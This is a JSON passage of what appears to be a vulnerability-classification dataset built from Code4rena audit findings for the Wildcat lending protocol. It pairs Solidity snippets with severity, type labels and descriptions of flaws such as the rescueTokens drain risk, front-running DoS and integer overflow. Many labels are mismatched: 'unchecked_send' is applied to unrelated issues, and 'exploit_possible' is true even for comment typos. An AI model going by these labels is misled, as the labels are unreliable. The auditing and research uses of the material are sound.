    "description": "https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatArchController.sol#L200 The `WildcatArchController` contract includes functionality to blacklist assets, which is controlled solely by the contract owner. The contract allows the owner to add and remove assets from a blacklist without any checks or balances.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "WildcatSanctionsEscrow",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Issue",
    "description": "The WildcatSanctionsEscrow system is designed to isolate assets of sanctioned lenders. The release of these assets should ideally occur only when the lender initiates it, after they are no longer sanctioned or when the borrower explicitly overrides the sanction. The `releaseEscrow` function in the `WildcatSanctionsEscrow` contract can be called by any address, not just the account owner. While the funds are always sent to the correct account, this allows unauthorized parties to trigger the release.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nfunction releaseEscrow() public override {\n    require(msg.sender == account, \"Only account owner can release escrow\");\n    if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n    uint256 amount = balance();\n    address _account = account;\n    address _asset = asset;\n    asset.safeTransfer(_account, amount);\n    emit EscrowReleased(_account, _asset, amount);\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Fix",
    "description": "Modify the `releaseEscrow` function to only allow calls from the `account` owner: function releaseEscrow() public override { require(msg.sender == account, \"Only account owner can release escrow\"); if (!canReleaseEscrow()) revert CanNotReleaseEscrow(); uint256 amount = balance();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.375,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n    uint256 numBatches = _withdrawalData.unpaidBatches.length();\n    uint256 i;\n    while (i++ < numBatches && availableLiquidity > 0) { \n      // Process the next unpaid batch using available liquidity\n      uint256 normalizedAmountPaid = _processUnpaidWithdrawalBatch(state, availableLiquidity); \\\n      // Reduce liquidity available to next batch\n      availableLiquidity -= normalizedAmountPaid;\n    } \n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## 1. `availableLiquidity > 0` check is not performed before the `_applyWithdrawalBatchPayment` function is called",
    "description": "The `WildcatMarket.closeMarket` function the `_processUnpaidWithdrawalBatch` function is called to process the unpaid withdrawal batches in the `_withdrawalData.unpaidBatches` FIFOQueue. In the `WildcatMarketWithdrawals._processUnpaidWithdrawalBatch` call the `_applyWithdrawalBatchPayment` function is called by providing the `availableLiquidity` as an input parameter. But the issue is `availableLiquidity > 0` check is not performed here. But this `availableLiquidity > 0` check is performed prior to every other occassion where the `_applyWithdrawalBatchPayment` is called. Since the `_processUnpaidWithdrawalBatch` is called in a loop the `_applyWithdrawalBatchPayment` is also called in a loop and as a result of `availableLiquidity > 0` not being checked the trasnaction will continue loop through with the `availableLiquidity == 0` until the `unpaid batches index increment to the end`. In addition to that the `_processUnpaidWithdrawalBatch` function will always check the last batch which could not be fully paid off in the `_withdrawalData.unpaidBatches.first()` retrieval since the `_withdrawalData.unpaidBatches.shift()` is not called as there was not enough liquidity fully pay of the withdrawals of the batch. This will result in undue wastage of gas and redundant execution. Hence it is recommended to update the logic used to settle the unpaid batches in the `WildcatMarketWithdrawals._processUnpaidWithdrawalBatch` function as shown below: uint256 numBatches = _withdrawalData.unpaidBatches.length();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.416,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " to transfer the entire underlying token balance deposited by the lenders to the malicious borrower himself. This opens up the protocol to a significant exploit, where a malicious borrower could essentially drain tokens from the market, bypassing normal operational checks.\n\nThis issue is further prevalent since only a ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "3. Potential Exploit in rescueTokens function Due to Borrower-Controlled Underlying Asset",
    "description": "Vulnerability Description: The `rescueTokens` function in `WildcatMarket.sol` is designed to allow the borrower to recover tokens accidentally sent to the market contract. However, the borrower has control over which `asset token` is set as the `underlying asset` for the market. This creates an opportunity for the borrower to maliciously set a token which has two different addresses as the underlying token. The critical line of code checks whether the token to be rescued is either the underlying asset or the contract's own address as shown below: if ((token == asset).or(token == address(this))) { revert_BadRescueAsset();",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.32,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nfunction repay(uint256 amount) external onlyBorrower nonReentrant sphereXGuardExternal {\n    if (amount == 0) revert_NullRepayAmount();\n\n    asset.safeTransferFrom(msg.sender, address(this), amount);\n    emit_DebtRepaid(msg.sender, amount);\n\n    MarketState memory state = _getUpdatedState();\n    if (state.isClosed) revert_RepayToClosedMarket();\n    \n    hooks.onRepay(amount, state, _runtimeConstant(0x24));\n    _writeState(state);\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "4. Lack of onlyBorrower Modifier in WildcatMarket.repay Function",
    "description": "Vulnerability Description: In the `WildcatMarket.repay` function, a NatSpec comment advises that this function should only be used by the borrower and not by lenders or unrelated third parties: However, the function does not include the onlyBorrower modifier to enforce this restriction, leaving the function open to being called by any account. This could result in unintended behavior where lenders or third parties mistakenly or maliciously attempt to repay on behalf of the borrower, potentially leading to mismanagement of funds or unintended repayment actions. Impact: Without the onlyBorrower modifier, there is a risk that unrelated parties could interact with the repay function, leading to:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.445,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " should have been used in its place.\n\nHence it is recommended to update the ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "5. Incorrect `Base Size` parameter Used in `HooksConfig.onBorrow` Calldata `Size` Calculation",
    "description": "In the `HooksConfig.onBorrow` function the `size` of the calldata for the `hooks.onBorrow` function call is calculated as follows: let size := add(RepayHook_Base_Size, extraCalldataBytes) As you could see the wrong base size value (`RepayHook_Base_Size`) is used. The correct value `BorrowHook_Base_Size` should have been used in its place. Hence it is recommended to update the `calldata size calcualtion` as shown below: let size := add(BorrowHook_Base_Size, extraCalldataBytes)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.076,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "HooksConfig.onBorrow",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "6. Free Memory Pointer Not Updated at the end of the  `HooksConfig.onRepay`, `HooksConfig.onBorrow` functions",
    "description": "Vulnerability Description: In the HooksConfig contract, the assembly blocks within functions such as onRepay and onBorrow do not update the free memory pointer at the end of the block. The free memory pointer is used by the EVM to track the location of free memory space, and failing to update it could potentially lead to issues if subsequent operations expect the pointer to be accurate. Currently, this does not seem to cause an issue within the protocol's existing structure. However, this practice might introduce problems if the protocol is extended or modified in the future. Code that relies on accurate memory management could encounter unexpected behavior, such as memory corruption, overwriting, or vulnerabilities, as new functions may assume an incorrect free memory location. Impact: While the immediate impact is low, failing to update the free memory pointer may create risks in future versions or extensions of the protocol. As the protocol evolves, functions depending on proper memory management may exhibit erratic behavior or cause vulnerabilities if the free memory pointer is not correctly maintained.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  // Size of onDeposit.selector + lender + scaledAmount + state + extraData.offset + extraData.length\n  uint256 internal constant DepositHook_Base_Size = 0x0244;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "7. Wrong Natspec comments in the `HooksConfig` contract",
    "description": "The following natspec comment is wrong. // Size of lender + scaledAmount + state + extraData.offset + extraData.length uint256 internal constant DepositHook_Base_Size = 0x0244; The `DepositHook_Base_Size` includes the `4 bytes` of the `IHooks.onDeposit.selector` function selector as well. But it is not referenced in the above natspec comment. Hence the above natspec comment should be updated accordingly. // Size of onDeposit.selector + lender + scaledAmount + state + extraData.offset + extraData.length",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.171,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n  /**\n   * @dev Returns the amount of underlying assets that can be borrowed.\n   *\n   *      The borrower must maintain sufficient assets in the market to\n   *      cover 100% of pending withdrawals, 100% of previously processed\n   *      withdrawals (before they are executed), and the reserve ratio\n   *      times the outstanding debt (deposits not pending withdrawal).\n   *\n   *      Any underlying assets in the market above this amount can be borrowed.\n   */\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "8. Wrong natspec comments in the `MarketState.borrowableAssets` function",
    "description": "The `natspec comments` of the `MarketState.borrowableAssets` function is errorneous. It does not state the `inclusion of the accrued protocol fees` as shown below: /** * @dev Returns the amount of underlying assets that can be borrowed. * *      The borrower must maintain sufficient assets in the market to",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.466,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "if (amount > borrowable) revert_BorrowAmountTooHigh();",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "High",
    "title": "9. A malicious lender `DoS` a borrower from borrowing from the market",
    "description": "A malicious lender `DoS` a borrower from borrowing from the market. Let's consider the following scenario: 1. Malicious lender deposits a large amount of tokens into the market. 2. He then waits for teh borrower to initiate a `borrow` transaction. 3. lender front-runs the `borrow` transaction with a withdrawal and makes the `state.scaledPendingWithdrawals` larger thus the `liquidityRequired` is increased. 4. The `borrowable` amount is now less.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.054,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\nRecommended to assign the address state variables directly to the address local variables without redundant casting as shown below:\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "10. Redundant casting to `address` data type",
    "description": "In the `WildcatMarketBase._createEscrowForUnderlyingAsset` function there are redundant casting of address state variables to `address` again. address tokenAddress = address(asset); ... address sentinelAddress = address(sentinel); Recommended to assign the address state variables directly to the address local variables without redundant casting as shown below:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.136,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n    WithdrawalBatch storage _batch = _withdrawalData.batches[expiry];\n    batch.scaledTotalAmount = _batch.scaledTotalAmount;\n    batch.scaledAmountBurned = _batch.scaledAmountBurned;\n    batch.normalizedAmountPaid = _batch.normalizedAmountPaid;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "11. The `WildcatMarketWithdrawals.getWithdrawalBatch` function can be optimized",
    "description": "The `WildcatMarketWithdrawals.getWithdrawalBatch` function has the following logic to retrive the `withdrawal batch` from the `_withdrawalData`: WithdrawalBatch storage _batch = _withdrawalData.batches[expiry]; batch.scaledTotalAmount = _batch.scaledTotalAmount; batch.scaledAmountBurned = _batch.scaledAmountBurned; batch.normalizedAmountPaid = _batch.normalizedAmountPaid;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.255,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "WildcatMarket.rescueTokens",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "12. No fund recovery mechanism for external tokens, in the `WildcatSanctionsEscrow` contract",
    "description": "The `WildcatSanctionsEscrow` contract is used to temporarily hold the funds of the sanctioned `lenders` until they are released from the sanctions. This contract allows anyone to recover the funds to the `lender,s` account the underlying tokens after the `lender` is released from the sanctions. But there is no recovery function in the `WildcatSanctionsEscrow` contract for other tokens which could be mistakenly deposited to the `WildcatSanctionsEscrow` contract. But similar functinality is currently implemented in the `WildcatMarket.rescueTokens` contract to withdraw the mistakenly deposited funds to the `WildcatMarket` contract. Hence it is recommended to add a recovery function in the `WildcatSanctionsEscrow` contract to withdraw the mistakenly deposited funds to the `WildcatSanctionsEscrow` contract. And the `borrower` should be allowed to call this function to retrive these funds to  his account similart to how it is done in the `WildcatMarket.rescueTokens`. https://github.com/code-423n4/2024-08-wildcat/blob/main/src/WildcatSanctionsEscrow.sol#L34-L44 https://github.com/code-423n4/2024-08-wildcat/blob/main/src/market/WildcatMarket.sol#L37-L42",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.026,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " will permenantly lose his funds.\n\nEven though the address collssion are extremely rare there is still a possibility of it happening and if it happens the ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "13. Address collission in the `escrow address` could lead to loss of funds of the sanctioned lender",
    "description": "The `WildcatSanctionsSentinel.getEscrowAddress` function is used to calculate the address of the escrow contract of the sanctioned lender. When address is derived via `CREATE2` the truncation of the `bytes32` to bytes20 happesn thus the least significant 20 bytes are taken as the `escrow contract address`. The `WildcatSanctionsSentinel.createEscrow` function is used to deploy the escrow contract. In this fucntion if the computed `escrow contract address` already has contract logic deployed the trasnaction will return the `escrow contract address` without any further checks. But there is a possibitliy of `address collissioin in CREATE2` address derivation. Now let's consider the following scenario: 1. The `WildcatSanctionsSentinel.createEscrow` is called to create a new escrow contract for a sanctioned lender. 2. The derived address via CREATE2 is `Address A`.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.155,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nHence if the function selectors are changed in the future due to addtion of a new parameter this could lead to unexpected behaviour in the ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "14. Function selectors are hardcoded in the low-level assembly call fucntions",
    "description": "The `WildcatMarketBase` contract calls the `WildcatSanctionsSentinel` contract for different parameter validation checks such as in the `WildcatMarketBase._isFlaggedByChainalysis` and `WildcatMarketBase._isSanctioned` function. But when these low level `calls` are made via assembly, to the `sentinel` contract the function selector is hardcoded as shown below: mstore(0, 0x06e74444) Hence if the function selectors are changed in the future due to addtion of a new parameter this could lead to unexpected behaviour in the `WildcatMarketBase` contract and the protocol as a whole. Hence it is recommended get the function selector via the `interface of the contract` and calling the `function.selector` of the respective function in the corresponding interface.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.141,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "AccessControlHooks::onQueueWithdrawal",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-01] `AccessControlHooks::onQueueWithdrawal` missing validation",
    "description": "____",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.037,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_tryValidateAccess()",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Description",
    "description": "The `onQueueWithdrawal()` hook in AccessControlHooks is missing access control that ensures it can only be called by a hooked market. In some cases this would allow a malicious user to unset a victim's credentials via `_tryValidateAccess()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n  function onQueueWithdrawal(\n    address lender,\n    uint32 /* expiry */,\n    uint /* scaledAmount */,\n    MarketState calldata /* state */,\n    bytes calldata hooksData\n  ) external override {\n\n+   if (!market.isHooked) revert NotHookedMarket();\n\n    LenderStatus memory status = _lenderStatus[lender];\n    if (\n      !isKnownLenderOnMarket[lender][msg.sender] && !_tryValidateAccess(status, lender, hooksData)\n    ) {\n      revert NotApprovedLender();\n    }\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommendation",
    "description": "Add the check as below: function onQueueWithdrawal( address lender, uint32 /* expiry */, uint /* scaledAmount */,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.47,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " from end of calldata to hook calldata\n        calldatacopy(\n          add(headPointer, BorrowHook_ExtraData_TailOffset),\n          BorrowCalldataSize,\n          extraCalldataBytes\n        )\n\n-       let size := add(RepayHook_Base_Size, extraCalldataBytes)\n+       let size := add(Borrow_Base_Size, extraCalldataBytes)\n        if iszero(call(gas(), target, 0, add(ptr, 0x1c), size, 0, 0)) {\n          returndatacopy(0, 0, returndatasize())\n          revert(0, returndatasize())\n        }\n      }\n    }\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommendation",
    "description": "Update as below: function onBorrow(HooksConfig self, uint256 normalizedAmount, MarketState memory state) internal { address target = self.hooksAddress(); uint32 onBorrowSelector = uint32(IHooks.onBorrow.selector); if (self.useOnBorrow()) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.506,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n    address hooksTemplate = getHooksTemplateForInstance[hooksInstance];\n    if (hooksTemplate == address(0)) {\n      revert HooksInstanceNotFound();\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Description",
    "description": "The process for deploying a market involves first deploying a hooksInstance, which is based off a template, and then deploying a market using that hooksInstance. However, the template used to create the hooksInstance may have subsequently been found to contain a bug and disabled by the protocol and hence should not be used anymore. Given that multiple markets can be run off a single hooksInstance it is likely that a borrower would not realise that the hook has been disabled and is no longer fit for purpose anymore. The check here in [`deployMarket()`](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/HooksFactory.sol#L491-L545) will revert if the template doesn't exist but there is non check whether the template has been disabled. address hooksTemplate = getHooksTemplateForInstance[hooksInstance];",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.156,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "diff\n  function deployMarket(\n    DeployMarketInputs calldata parameters,\n    bytes calldata hooksData,\n    bytes32 salt,\n    address originationFeeAsset,\n    uint256 originationFeeAmount\n  ) external override nonReentrant returns (address market) {\n    if (!IWildcatArchController(_archController).isRegisteredBorrower(msg.sender)) {\n      revert NotApprovedBorrower();\n    }\n    address hooksInstance = parameters.hooks.hooksAddress();\n    address hooksTemplate = getHooksTemplateForInstance[hooksInstance];\n    if (hooksTemplate == address(0)) {\n      revert HooksInstanceNotFound();\n    }\n+   if (!template.enabled) {\n+     revert HooksTemplateNotAvailable();\n+   }\n    HooksTemplate memory templateDetails = _templateDetails[hooksTemplate];\n    market = _deployMarket(\n      parameters,\n      hooksData,\n      hooksTemplate,\n      templateDetails,\n      salt,\n      originationFeeAsset,\n      originationFeeAmount\n    );\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Recommendation",
    "description": "Add the check as below: function deployMarket( DeployMarketInputs calldata parameters, bytes calldata hooksData, bytes32 salt,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 32,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.931,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n    function _applyWithdrawalBatchPayment(\n      WithdrawalBatch memory batch,\n      MarketState memory state,\n      uint32 expiry,\n      uint256 availableLiquidity\n    ) internal {\n>>>       uint104 scaledAvailableLiquidity = state.scaleAmount(availableLiquidity).   toUint104();\n    \n      // more code\n    }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "Description",
    "description": "If a market uses a token with high decimals, such as NEAR token (24 decimals), it is possible for there to be an overflow in [`_applyWithdrawalBatchPayment()`](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L665-L695) which would cause reverts across a wide range of functions. If the `maxTotalSupply` is larger than uint104; which is permitted as it can go up to a maximum of uint128 then the scaledAvailableLiquidity calculation can oveflow which will cause a revert due to the [`safeCastLib`](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/libraries/SafeCastLib.sol#L65-L67) being used. function _applyWithdrawalBatchPayment( WithdrawalBatch memory batch, MarketState memory state,",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.313,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_applyWithdrawalBatchPayment()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "POC",
    "description": "1. Market opens with `maxTotalSupply > uint104` 2. Market quickly receives more than uint104 of underlying asset before borrower borrows 3. Most functions of the market will now be DOS'd  due to the overflow revert in `_applyWithdrawalBatchPayment()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.03,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n    function setProtocolFeeBips(\n      uint16 _protocolFeeBips\n    ) external nonReentrant sphereXGuardExternal {\n      if (msg.sender != factory) revert_NotFactory();\n      if (_protocolFeeBips > 1_000) revert_ProtocolFeeTooHigh();\n      MarketState memory state = _getUpdatedState();\n      // @audit : revert here\n>>>   if (state.isClosed) revert_ProtocolFeeChangeOnClosedMarket();\n      if (_protocolFeeBips == state.protocolFeeBips) revert_ProtocolFeeNotChanged();\n      hooks.onSetProtocolFeeBips(_protocolFeeBips, state);\n      state.protocolFeeBips = _protocolFeeBips;\n      emit ProtocolFeeBipsUpdated(_protocolFeeBips);\n      _writeState(state);\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Description",
    "description": "The protocol updates fees by first calling `updateHooksTemplateFees()` to store the new fee in a particular template which from then on will apply to any new markets created with that template. The fee change should then be propagated out to existing markets, using that template, by calling one of the two `pushProtocolFeeBipsUpdates()` functions [here](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/HooksFactory.sol#L594-L596) and [here](https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/HooksFactory.sol#L553-L587). They can be called by anyone and take a starting index and ending index. Likely it would be the protocol proogating a fee increase or lenders/borrower for a fee decrease. function pushProtocolFeeBipsUpdates(address hooksTemplate) external { pushProtocolFeeBipsUpdates(hooksTemplate, 0, type(uint256).max);",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.662,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOBManager.sol\n\n26:     mapping(address clob => bool) isCLOB;\n\n28:     mapping(address account => bool) maxLimitWhitelist;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
